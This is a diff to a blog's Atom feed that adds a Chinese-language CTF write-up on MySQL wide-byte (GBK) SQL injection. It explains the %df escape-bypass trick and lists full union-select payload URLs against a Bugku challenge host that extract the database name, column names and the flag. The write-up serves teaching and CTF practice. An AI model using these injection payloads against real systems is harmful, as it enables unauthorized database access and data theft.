@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://ju5tw4nty0u.top/"/>
-  <updated>2018-04-24T11:47:12.983Z</updated>
+  <updated>2018-04-25T18:15:06.763Z</updated>
   <id>http://ju5tw4nty0u.top/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>mysql之利用宽字节进行注入</title>
+    <link href="http://ju5tw4nty0u.top/2018/04/26/mysql%E4%B9%8B%E5%88%A9%E7%94%A8%E5%AE%BD%E5%AD%97%E8%8A%82%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5/"/>
+    <id>http://ju5tw4nty0u.top/2018/04/26/mysql之利用宽字节进行注入/</id>
+    <published>2018-04-25T17:02:17.000Z</published>
+    <updated>2018-04-25T18:15:06.763Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h1><p>这里直接引用天书里面的介绍（有点懒233333<br>针对<code>’</code>和<code>\</code>的过滤，我们在此介绍一下宽字节注入的原理和基本用法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个汉字（前一个ascii码大于128才能到汉字的范围）。</span><br><span class="line">我们在过滤 ’ 的时候，往往利用的思路是将 ‘ 转换为 \’ 。</span><br><span class="line">因此我们在此想办法将 ‘ 前面添加的 \ 除掉，思路如下：</span><br><span class="line">%df 吃掉 \ 具体的原因是 urlencode(\&apos;) = %5c%27，我们在%5c%27 前面添加%df，形</span><br><span class="line">成%df%5c%27，而上面提到的 mysql 在GBK 编码方式的时候会将两个字节当做一个汉字，此</span><br><span class="line">事%df%5c 就是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。</span><br></pre></td></tr></table></figure></p><h1 id="Bugku的一道题目"><a href="#Bugku的一道题目" class="headerlink" title="Bugku的一道题目"></a>Bugku的一道题目</h1><p><a href="http://103.238.227.13:10083/" target="_blank" rel="noopener">题目地址</a><br>1、通过一些测试发现找不到注入点，查看源代码发现编码方式为<code>gb2312</code>，于是便想到是不是宽字节注入，当提交<code>id=1%df&#39;</code>时出现了报错信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;1運&apos;&apos; LIMIT 1&apos; at line 1</span><br><span class="line">```</span><br><span class="line">这说明了确实存在宽字节注入，我们开始构造payload</span><br><span class="line">2、查询数据库</span><br></pre></td></tr></table></figure></p><p><a href="http://103.238.227.13:10083/index.php?id=1%df" target="_blank" rel="noopener">http://103.238.227.13:10083/index.php?id=1%df</a>‘ union select 1,database()–+<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">![1](/mysql之利用宽字节进行注入/kuming.png)</span><br><span class="line">3、由于表名题目直接给了，所以我们直接查字段名</span><br></pre></td></tr></table></figure></p><p><a href="http://103.238.227.13:10083/index.php?id=1%df" target="_blank" rel="noopener">http://103.238.227.13:10083/index.php?id=1%df</a>‘ union select 1,group_concat(column_name) from information_schema.columns where table_name=0x6b6579–+<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">![1](/mysql之利用宽字节进行注入/ziduan.png)</span><br><span class="line">4、获取字段值</span><br></pre></td></tr></table></figure></p><p><a href="http://103.238.227.13:10083/index.php?id=-1%df" target="_blank" rel="noopener">http://103.238.227.13:10083/index.php?id=-1%df</a>‘ union select 1,string from sql5.key–+<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">![1](/mysql之利用宽字节进行注入/flag.png)</span><br><span class="line"></span><br><span class="line"># 解题过程中遇到的一些坑</span><br><span class="line">1、当payload为</span><br></pre></td></tr></table></figure></p><p><a href="http://103.238.227.13:10083/index.php?id=-1%df" target="_blank" rel="noopener">http://103.238.227.13:10083/index.php?id=-1%df</a>‘ union select 2,string from key where id=1–+<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现页面报错了</span><br></pre></td></tr></table></figure></p><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘key where id=1– ‘ LIMIT 1’ at line 1<br><code>``这里百度了好久都不知道是什么问题，后面找到一位师傅的wp，才发现原来表名和字段名是一样的，然后如果直接从key取数据的话就会出错，这里可以使用反引号来区分表名和字段名，也可以指定</code>sql5.key`这种方法来指定表名。<br><a href="https://blog.csdn.net/wy_97/article/details/77407328" target="_blank" rel="noopener">参考链接</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;原理介绍&quot;&gt;&lt;a href=&quot;#原理介绍&quot; class=&quot;headerlink&quot; title=&quot;原理介绍&quot;&gt;&lt;/a&gt;原理介绍&lt;/h1&gt;&lt;p&gt;这里直接引用天书里面的介绍（有点懒233333&lt;br&gt;针对&lt;code&gt;’&lt;/code&gt;和&lt;code&gt;\&lt;/code&gt;的过滤，
+      
+    
+    </summary>
+    
+    
+      <category term="CTF" scheme="http://ju5tw4nty0u.top/tags/CTF/"/>
+    
+      <category term="SQL" scheme="http://ju5tw4nty0u.top/tags/SQL/"/>
+    
+      <category term="WP" scheme="http://ju5tw4nty0u.top/tags/WP/"/>
+    
+  </entry>
   
   <entry>
     <title>mysql之利用update进行注入</title>
